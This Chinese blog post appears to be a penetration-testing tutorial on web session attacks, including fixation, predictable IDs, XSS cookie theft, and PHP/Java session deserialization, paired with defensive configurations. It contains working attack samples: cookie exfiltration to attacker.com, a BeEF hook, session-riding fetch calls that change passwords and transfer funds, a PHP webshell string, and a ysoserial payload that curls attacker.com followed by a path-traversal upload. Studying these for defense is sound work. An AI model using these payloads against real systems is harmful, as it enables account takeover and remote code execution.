---
title: Session安全攻防 — 从会话固定到反序列化的攻击链与防御
date: 2026-08-15 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: 系统梳理 Session 安全攻击面：Session 固定、ID 可预测性、Cookie 属性绕过、XSS 劫持、PHP/Java 反序列化、超时缺陷及纵深防御实践。
---

## 前言

Session 是 Web 应用维持用户状态的核心机制：用户登录后服务端创建 Session 并通过 Cookie 下发 ID，后续凭此恢复上下文。Session 一旦被窃取或操纵，攻击者可绕过认证直接接管账户。常见 Session Cookie 名称有 PHP 的 `PHPSESSID`、Java 的 `JSESSIONID`、ASP.NET 的 `ASP.NET_SessionId`、Node.js 的 `connect.sid` 等。
**免责声明：本文仅供安全研究与学习参考，严禁利用文中技术进行非法攻击。作者对读者使用文中信息导致的任何后果不承担法律责任。**

---

## 一、Session 固定攻击 (Session Fixation)

攻击者先获取一个有效 Session ID，诱骗受害者用该 ID 登录，受害者认证后攻击者以同 ID 即可接管账户。

```php
// php.ini 危险配置 — 允许 URL 传递 Session ID
session.use_trans_sid = 1       // 自动将 SID 附加到 URL
session.use_only_cookies = 0    // 允许 URL 参数设置 SID
```

```html
<!-- 钓鱼链接：受害者登录后 SID 不变，攻击者用同 SID 即可接管 -->
<a href="https://bank.com/login.php?PHPSESSID=abc123">点击领取优惠券</a>
```

也能通过中间人注入 Cookie：`Set-Cookie: JSESSIONID=FIXED; Domain=.target.com; Path=/`。
**渗透测试：**
```bash
curl -v https://target.com/ 2>&1 | grep -i set-cookie   # 获取干净 SID
# 受害者登录后，攻击者以同 SID 访问
curl -b "JSESSIONID=FIXED_SID" https://target.com/dashboard
```
**防御 — 任何权限提升后重新生成 Session ID：**
```php
session_regenerate_id(true);  // PHP: true 删除旧文件
```

```java
HttpSession old = request.getSession(false);
if (old != null) old.invalidate();
HttpSession s = request.getSession(true);
```

```python
session.clear()          # Flask
session['user_id'] = user.id
```

---

## 二、Session ID 可预测性

生成算法不够随机时，攻击者可预测他人 SID 实现无接触劫持。

```php
$sid = md5(time());                         // 一天 86400 种可能，枚举数秒
$sid = $lastId + 1;                          // 递增序列，相邻尝试即可
$sid = base64($username . ":" . $ip);       // 知道用户名即可构造
```

**手动熵值分析：**

```python
import requests
sids = [requests.get('https://target.com/').cookies.get('JSESSIONID', '') for _ in range(100)]
print(f"唯一 SID: {len(set(sids))}/100")     # 应接近 100
lengths = [len(s) for s in sids]
print(f"长度: {min(lengths)}-{max(lengths)}")  # 应固定
```
Burp Sequencer 分析关注 FIPS-140 熵值 >= 128 bits 及每字符位熵分布。
**防御：**

```java
SecureRandom r = new SecureRandom(); byte[] b = new byte[32]; r.nextBytes(b);
```

```php
session_start();  // PHP 内置用 /dev/urandom，勿自己造轮子
```

---

## 三、Cookie 安全属性：Secure / HttpOnly / SameSite

```
Set-Cookie: SESSIONID=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
            │                │        │           └─ 跨站控制
            │                │        └─ JS 不可读
            │                └─ 仅 HTTPS
```

### Secure — 缺则 MITM 窃取

```bash
tcpdump -i eth0 -A 'tcp port 80' | grep -i "Cookie:"   # 授权测试
```
**HSTS 旁路** — HTTP 子域注入 Cookie 覆盖 HTTPS 父域：
```http
Set-Cookie: SESSIONID=malicious; Domain=.target.com; Path=/
```

### HttpOnly — 缺则 XSS 直接窃取

```javascript
new Image().src = 'https://attacker.com/log?' + document.cookie;  // 窃取 Session
```

**HttpOnly 不是 XSS 的绝对防护** — 攻击者仍可在受害者浏览器内发起自动携带 Cookie 的请求（见第四章）。

### SameSite

| 值 | 行为 |
|----|------|
| Strict | 完全禁跨站发送 |
| Lax    | 仅同站请求 + 顶级 GET 导航携带（Chrome 默认） |
| None   | 全部携带，必配 Secure |

```html
<!-- Lax 下顶级 GET 导航仍生效 -->
<a href="https://bank.com/deleteAccount">点击抽奖</a>
```

### 前缀加固

```http
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: __Secure-session=abc123; Path=/; Secure
```
`__Host-` 强制 Secure + Path=/ + 无 Domain；`__Secure-` 强制 Secure。浏览器拒收不合规前缀。

---

## 四、XSS 劫持 Session

**直接窃取（缺 HttpOnly）：** XSS → `document.cookie` → 自建接收器 → 导入浏览器 → 身份接管。

**Session Riding（有 HttpOnly 仍可操作）** — 无需读 Cookie，直接在受害者浏览器发请求：

```javascript
// 改密码
fetch('/api/changePassword', {
    method: 'POST',
    body: JSON.stringify({newPassword: 'hacked', confirmPassword: 'hacked'}),
    credentials: 'include'
});

// 添加攻击者邮箱 → 密码重置接管
fetch('/settings/security/addBackupEmail', {
    method: 'POST', body: 'email=attacker@evil.com', credentials: 'include'
});

// 转账
var x = new XMLHttpRequest();
x.open('POST', '/api/transfer', true);
x.withCredentials = true;
x.send(JSON.stringify({to: 'attacker', amount: 9999}));
```

**BeEF 持久化：** `<script src="//attacker.com:3000/hook.js"></script>` 上线后 300+ 命令模块。
**防御：** 输出编码 + CSP（根本）；HttpOnly（降影响不消除）；关键操作二次验证；IP/UA 绑定。

---

## 五、Session 反序列化攻击

### PHP Session 反序列化

处理器差异（php / php_serialize / php_binary）结合用户可控数据写入 Session 触发攻击：

```php
// 服务端代码
session_start();
$_SESSION['user_input'] = $_GET['data'];  // 攻击者可控
// 攻击 Payload: ?data=|O:8:"EvilClass":1:{s:4:"cmd";s:6:"whoami";}
// "|" 后内容被当序列化对象，触发 __wakeup() / __destruct()
```

**Pop Chain 起点：**

```php
class Logger {
    function __destruct() {
        file_put_contents($this->logFile, $this->logData, FILE_APPEND);
    }
}
// 构造 logFile=shell.php, logData=<?php system($_GET["cmd"]);?>
```

```bash
# PHPGGC 生成 Payload
phpggc -l                          # 列出所有 Gadget Chain
phpggc Monolog/RCE1 system 'id'
phpggc Laravel/RCE1 system 'whoami'
```

### Java Session 反序列化

Tomcat 以序列化文件存 Session 于 `work/Catalina/localhost/`。Classpath 有 Gadget Chain 时写入恶意序列化对象即可 RCE：

```bash
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/$(id)' > evil.session
curl -X PUT --data-binary @evil.session \
  'https://target.com/upload/../../work/Catalina/localhost/ROOT/evil.session'
```

常用 Gadget：CommonsCollections1-7、CommonsBeanutils1、Spring1/2、Jdk7u21。检测先用 `ysoserial URLDNS` 做 DNS 探测。

### 防御
- 不反序列化不可信数据；用 JSON 序列化替代原生反序列化
- Java：`ValidatingObjectInputStream` 白名单过滤
- 限制 Session 目录写入权限，定期清理文件

---

## 六、Session 超时与并发控制

**超时风险：**

```php
session.gc_maxlifetime = 0      // 永不过期 — 极危险
session.gc_maxlifetime = 86400  // 24小时
```

**常见失误 — 退出仅删 Cookie 不销毁 Session：**

```python
# ❌ 服务端 Session 仍有效
resp.delete_cookie('sessionid')

# ✅ 先销毁再清 Cookie
session.clear()
resp.delete_cookie('sessionid')
```

**合理策略：**

```java
session.setMaxInactiveInterval(30 * 60);  // 闲置 30min
// 绝对超时 8h 强制重认证
if (now - (long)session.getAttribute("LOGIN_TIME") > 8*3600*1000) {
    session.invalidate(); response.sendRedirect("/login?reason=timeout");
}
```

**并发控制：**

```java
Map<String, String> map = new ConcurrentHashMap<>();
void login(String user, String sid) {
    if (map.containsKey(user)) sessionRegistry.get(map.get(user)).invalidate();
    map.put(user, sid);
}
```

---

## 七、防御最佳实践

**纵深防御体系：**
- **传输**：全站 HTTPS + HSTS (max-age>=1年, includeSubDomains)，Cookie Secure
- **标识符**：CSPRNG >=128bits SID，登录后 regenerate，禁 URL 传参
- **属性**：HttpOnly + SameSite=Lax + `__Host-` 前缀，缺一不可
- **生命周期**：闲置 15-30min，绝对 4-8h，退出销毁，改密全失效
- **检测**：IP/UA 绑定，并发控制，异常告警

**各语言安全配置：**

```php
// PHP php.ini
session.cookie_secure = On
session.cookie_httponly = On
session.cookie_samesite = "Lax"
session.use_strict_mode = 1
session.use_only_cookies = 1
session.use_trans_sid = 0
session.sid_length = 48
session.gc_maxlifetime = 1440
```

```java
<!-- Java web.xml -->
<session-config>
    <session-timeout>30</session-timeout>
    <cookie-config><http-only>true</http-only><secure>true</secure></cookie-config>
    <tracking-mode>COOKIE</tracking-mode>
</session-config>
```

```python
# Flask
from datetime import timedelta
app.config.update(SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True,
                  SESSION_COOKIE_SAMESITE='Lax',
                  PERMANENT_SESSION_LIFETIME=timedelta(minutes=30))
app.secret_key = os.urandom(32)
```

```javascript
// Node.js express-session
const RedisStore = require('connect-redis')(session);
app.use(session({
    store: new RedisStore({ client: redisClient }),
    secret: process.env.SESSION_SECRET, name: '__Host-sid',
    resave: false, saveUninitialized: false,
    cookie: { secure: true, httpOnly: true, sameSite: 'lax', maxAge: 30*60*1000, path: '/' }
}));
app.post('/login', (req, res) => req.session.regenerate(err => {
    req.session.user = user.id; res.redirect('/dashboard');
}));
```

**Nginx 反向代理加固：**
```nginx
server {
    listen 443 ssl http2;
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    location / {
        proxy_pass http://backend:8080;
        proxy_cookie_path / "/; Secure; HttpOnly; SameSite=Lax";
    }
}
```

**渗透测试检查清单：**
```
[ ] 全站 HTTPS + HSTS？HTTP 降级？
[ ] Cookie Secure/HttpOnly/SameSite？
[ ] 登录后 SID 再生成？退出销毁？
[ ] SID 可预测？（Burp Sequencer）
[ ] URL 可传 SID？固定漏洞？反序列化点？
[ ] 关键操作二次认证？超时合理？改密旧 Session 失效？并发控制？
```

---

## 总结

Session 安全是纵深防御典型场景：传输层全站 HTTPS + HSTS + Cookie Secure；标识符层 CSPRNG 强随机 + 登录后 regenerate；属性层 HttpOnly + SameSite=Lax + `__Host-` 前缀；存储层谨防反序列化；生命周期层合理超时 + 退出销毁 + 改密全失效；检测层 IP/UA 绑定 + 异常告警。纵深防御使攻击成本呈指数级增长。

---

*参考资料：OWASP Session Management Cheat Sheet · PHP Session 安全文档 · Tomcat Session 持久化 · RFC 6265*
